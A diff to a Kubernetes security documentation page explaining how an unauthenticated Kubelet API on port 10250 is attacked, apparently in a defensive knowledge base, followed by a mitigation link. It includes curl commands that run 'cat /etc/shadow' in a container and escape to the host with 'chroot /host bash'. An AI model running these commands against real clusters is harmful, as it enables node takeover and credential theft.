@@ -1,61 +1,68 @@
 ---
-sidebar_position: 9
+sidebar_position: 5
 title: "Exposed Kubelet API"
 description: "How an exposed Kubelet API can be exploited to execute commands on nodes and compromise Kubernetes clusters."
 ---
 
 # Exposed Kubelet API
 
-The **Kubelet API** is responsible for managing pods on each node in a Kubernetes cluster. If improperly secured, attackers can **execute commands on worker nodes, retrieve secrets, and gain full control over workloads**.
+The **Kubelet API** manages pods on individual nodes in a Kubernetes cluster. When left exposed and unauthenticated, it allows attackers to execute commands on containers or even the underlying host, putting the entire cluster at risk.
+
+This article demonstrates how attackers discover and exploit insecure Kubelet APIs to gain remote control over nodes and escalate privileges.
 
 ---
 
 ## Exploitation Steps: Gaining Access to the Kubelet API
 
-An attacker scans the cluster network to identify an open **Kubelet API port (10250)**.
+### 1. Scan for Exposed Kubelet Ports
 
-### Step 1: Scan for Open Ports
-
-The attacker runs a network scan to discover exposed Kubelets:
+Attackers scan the cluster’s IP range for open Kubelet ports (default: 10250):
 
 ```bash
 nmap -p 10250 --open <cluster-ip-range>
 ```
 
-### Step 2: Query the Kubelet API
+### 2. Query the Kubelet API
 
-If authentication is **not enforced**, the attacker lists running pods:
+If authentication is not required, the attacker lists all pods on the node:
 
 ```bash
 curl -k https://<kubelet-ip>:10250/pods
 ```
 
-### Step 3: Execute Commands on a Node
+This reveals metadata and container names that can be used for further exploitation.
 
-If the Kubelet API allows unauthenticated execution, the attacker runs a command inside a pod:
+### 3. Execute Commands in a Container
+
+If unauthenticated access is allowed, the attacker can run arbitrary commands inside containers:
 
 ```bash
 curl -k -X POST "https://<kubelet-ip>:10250/run/<namespace>/<pod-name>/<container-name>" -d 'cmd=cat /etc/shadow'
 ```
 
-### Step 4: Escalate Privileges
+### 4. Escalate to the Host
 
-If the attacker gains access to a privileged container, they execute commands on the **host node**, leading to cluster-wide compromise:
+If the container has access to the host filesystem, the attacker can escape the container and access the host:
 
 ```bash
 curl -k -X POST "https://<kubelet-ip>:10250/run/default/root-container" -d 'cmd=chroot /host bash'
 ```
 
-### Result
-
-The attacker now has **remote code execution** on a Kubernetes worker node and can **compromise the entire cluster**.
+This effectively grants remote root shell access to the worker node.
 
 ---
 
-## Mitigation Steps
+### Result
 
-To protect against **Kubelet API exposure**, follow the security best practices outlined in:
+Exposing the Kubelet API without authentication or access controls can lead to:
 
-➡ **[Kubelet Security](/docs/best_practices/cluster_setup_and_hardening/node_security/kubelet_security)**
+- Remote command execution inside pods
+- Exposure of sensitive files and environment data
+- Host-level access via container escape
+- Full cluster compromise
 
-This guide covers techniques such as **disabling anonymous access, enforcing authentication, using RBAC to restrict API actions, and securing network access** to prevent unauthorized control over Kubelet APIs.
+---
+
+## Mitigation
+
+➡ [Kubelet Security](/docs/best_practices/cluster_setup_and_hardening/node_security/kubelet_security)
